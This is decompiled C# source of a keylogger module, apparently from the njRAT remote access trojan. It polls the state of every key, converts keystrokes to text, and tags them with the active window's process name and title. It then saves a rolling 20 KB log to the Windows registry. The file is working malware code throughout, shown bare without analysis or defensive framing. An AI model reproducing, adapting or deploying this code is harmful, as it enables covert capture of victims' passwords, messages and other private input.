using System;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Windows.Forms;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.Win32;

namespace j;

public class kl
{
	private int LastAV;

	private string LastAS;

	private Keys lastKey;

	public string Logs;

	public string vn;

	public kl()
	{
		//IL_0008: Unknown result type (might be due to invalid IL or missing references)
		lastKey = (Keys)0;
		Logs = "";
		vn = "[kl]";
	}

	[DllImport("user32.dll")]
	private static extern int ToUnicodeEx(uint a, uint b, byte[] c, [Out][MarshalAs(UnmanagedType.LPWStr)] StringBuilder d, int e, uint f, IntPtr g);

	[DllImport("user32.dll")]
	private static extern bool GetKeyboardState(byte[] a);

	[DllImport("user32.dll")]
	private static extern uint MapVirtualKey(uint a, uint b);

	[DllImport("user32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern int GetWindowThreadProcessId(IntPtr a, ref int b);

	[DllImport("user32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern int GetKeyboardLayout(int a);

	[DllImport("user32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern short GetAsyncKeyState(int a);

	private string AV()
	{
		try
		{
			IntPtr foregroundWindow = OK.GetForegroundWindow();
			int b = default(int);
			GetWindowThreadProcessId(foregroundWindow, ref b);
			Process processById = Process.GetProcessById(b);
			if (!(((foregroundWindow.ToInt32() == LastAV) & (Operators.CompareString(LastAS, processById.MainWindowTitle, false) == 0)) | (processById.MainWindowTitle.Length == 0)))
			{
				LastAV = foregroundWindow.ToInt32();
				LastAS = processById.MainWindowTitle;
				return "\r\n\u0001" + DateAndTime.get_Now().ToString("yy/MM/dd ") + processById.ProcessName + " " + LastAS + "\u0001\r\n";
			}
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
		return "";
	}

	private static string VKCodeToUnicode(uint a)
	{
		try
		{
			StringBuilder stringBuilder = new StringBuilder();
			byte[] array = new byte[255];
			if (!GetKeyboardState(array))
			{
				return "";
			}
			uint b = MapVirtualKey(a, 0u);
			IntPtr foregroundWindow = OK.GetForegroundWindow();
			int b2 = 0;
			int windowThreadProcessId = GetWindowThreadProcessId(foregroundWindow, ref b2);
			IntPtr g = (IntPtr)GetKeyboardLayout(windowThreadProcessId);
			ToUnicodeEx(a, b, array, stringBuilder, 5, 0u, g);
			return stringBuilder.ToString();
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
		return ((Enum)(Keys)checked((int)a)).ToString();
	}

	private string Fix(Keys k)
	{
		//IL_002a: Unknown result type (might be due to invalid IL or missing references)
		//IL_002b: Unknown result type (might be due to invalid IL or missing references)
		//IL_002c: Unknown result type (might be due to invalid IL or missing references)
		//IL_002f: Invalid comparison between Unknown and I4
		//IL_0034: Unknown result type (might be due to invalid IL or missing references)
		//IL_0036: Invalid comparison between Unknown and I4
		//IL_003d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0043: Invalid comparison between Unknown and I4
		//IL_0048: Unknown result type (might be due to invalid IL or missing references)
		//IL_004e: Invalid comparison between Unknown and I4
		//IL_0053: Unknown result type (might be due to invalid IL or missing references)
		//IL_0059: Invalid comparison between Unknown and I4
		//IL_005e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0061: Invalid comparison between Unknown and I4
		//IL_0066: Unknown result type (might be due to invalid IL or missing references)
		//IL_006c: Invalid comparison between Unknown and I4
		//IL_0071: Unknown result type (might be due to invalid IL or missing references)
		//IL_0074: Invalid comparison between Unknown and I4
		//IL_0079: Unknown result type (might be due to invalid IL or missing references)
		//IL_007f: Invalid comparison between Unknown and I4
		//IL_0084: Unknown result type (might be due to invalid IL or missing references)
		//IL_008a: Invalid comparison between Unknown and I4
		//IL_008f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0095: Invalid comparison between Unknown and I4
		//IL_009a: Unknown result type (might be due to invalid IL or missing references)
		//IL_009d: Invalid comparison between Unknown and I4
		//IL_00a2: Unknown result type (might be due to invalid IL or missing references)
		//IL_00a5: Invalid comparison between Unknown and I4
		//IL_00aa: Unknown result type (might be due to invalid IL or missing references)
		//IL_00ad: Invalid comparison between Unknown and I4
		//IL_00b2: Unknown result type (might be due to invalid IL or missing references)
		//IL_00b5: Invalid comparison between Unknown and I4
		//IL_00ba: Unknown result type (might be due to invalid IL or missing references)
		//IL_00bd: Invalid comparison between Unknown and I4
		//IL_00c2: Unknown result type (might be due to invalid IL or missing references)
		//IL_00c5: Invalid comparison between Unknown and I4
		//IL_00ca: Unknown result type (might be due to invalid IL or missing references)
		//IL_00cd: Invalid comparison between Unknown and I4
		//IL_00d2: Unknown result type (might be due to invalid IL or missing references)
		//IL_00d5: Invalid comparison between Unknown and I4
		//IL_00da: Unknown result type (might be due to invalid IL or missing references)
		//IL_00dd: Invalid comparison between Unknown and I4
		//IL_00e2: Unknown result type (might be due to invalid IL or missing references)
		//IL_00e5: Invalid comparison between Unknown and I4
		//IL_00ea: Unknown result type (might be due to invalid IL or missing references)
		//IL_00ed: Invalid comparison between Unknown and I4
		//IL_00ef: Unknown result type (might be due to invalid IL or missing references)
		//IL_00f2: Invalid comparison between Unknown and I4
		//IL_00f4: Unknown result type (might be due to invalid IL or missing references)
		//IL_00f7: Invalid comparison between Unknown and I4
		//IL_00fb: Unknown result type (might be due to invalid IL or missing references)
		//IL_00fe: Invalid comparison between Unknown and I4
		//IL_010b: Unknown result type (might be due to invalid IL or missing references)
		//IL_010e: Invalid comparison between Unknown and I4
		//IL_0110: Unknown result type (might be due to invalid IL or missing references)
		//IL_0113: Invalid comparison between Unknown and I4
		//IL_0117: Unknown result type (might be due to invalid IL or missing references)
		//IL_011a: Invalid comparison between Unknown and I4
		//IL_012a: Unknown result type (might be due to invalid IL or missing references)
		//IL_013c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0178: Unknown result type (might be due to invalid IL or missing references)
		//IL_019a: Unknown result type (might be due to invalid IL or missing references)
		//IL_01a0: Expected I4, but got Unknown
		//IL_01b6: Unknown result type (might be due to invalid IL or missing references)
		//IL_01bc: Expected I4, but got Unknown
		bool flag = OK.F.get_Keyboard().get_ShiftKeyDown();
		if (OK.F.get_Keyboard().get_CapsLock())
		{
			flag = ((!flag) ? true : false);
		}
		try
		{
			if ((int)k != 46 && (int)k != 8)
			{
				if ((int)k != 160 && (int)k != 161 && (int)k != 65536 && (int)k != 16 && (int)k != 131072 && (int)k != 17 && (int)k != 163 && (int)k != 162 && (int)k != 262144 && (int)k != 112 && (int)k != 113 && (int)k != 114 && (int)k != 115 && (int)k != 116 && (int)k != 117 && (int)k != 118 && (int)k != 119 && (int)k != 120 && (int)k != 121 && (int)k != 122 && (int)k != 123 && (int)k != 35)
				{
					if ((int)k == 32)
					{
						return " ";
					}
					if ((int)k != 13 && (int)k != 13)
					{
						if ((int)k == 9)
						{
							return "[TAP]\r\n";
						}
						checked
						{
							if (flag)
							{
								return VKCodeToUnicode((uint)k).ToUpper();
							}
							return VKCodeToUnicode((uint)k);
						}
					}
					if (Logs.EndsWith("[ENTER]\r\n"))
					{
						return "";
					}
					return "[ENTER]\r\n";
				}
				return "";
			}
			return "[" + ((Enum)k).ToString() + "]";
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			string result;
			if (flag)
			{
				result = Strings.ChrW((int)k).ToString().ToUpper();
				ProjectData.ClearProjectError();
				return result;
			}
			result = Strings.ChrW((int)k).ToString().ToLower();
			ProjectData.ClearProjectError();
			return result;
		}
	}

	public void WRK()
	{
		//IL_0031: Unknown result type (might be due to invalid IL or missing references)
		//IL_0033: Unknown result type (might be due to invalid IL or missing references)
		//IL_006d: Unknown result type (might be due to invalid IL or missing references)
		//IL_006e: Unknown result type (might be due to invalid IL or missing references)
		Logs = Conversions.ToString(OK.GTV(vn, ""));
		checked
		{
			try
			{
				int num = 0;
				while (true)
				{
					num++;
					int num2 = 0;
					do
					{
						if ((GetAsyncKeyState(num2) == -32767) & !OK.F.get_Keyboard().get_CtrlKeyDown())
						{
							Keys k = (Keys)num2;
							string text = Fix(k);
							if (text.Length > 0)
							{
								Logs += AV();
								Logs += text;
							}
							lastKey = k;
						}
						num2++;
					}
					while (num2 <= 255);
					if (num == 1000)
					{
						num = 0;
						int num3 = Conversions.ToInteger("20") * 1024;
						if (Logs.Length > num3)
						{
							Logs = Logs.Remove(0, Logs.Length - num3);
						}
						OK.STV(vn, Logs, RegistryValueKind.String);
					}
					Thread.Sleep(1);
				}
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				ProjectData.ClearProjectError();
			}
		}
	}
}
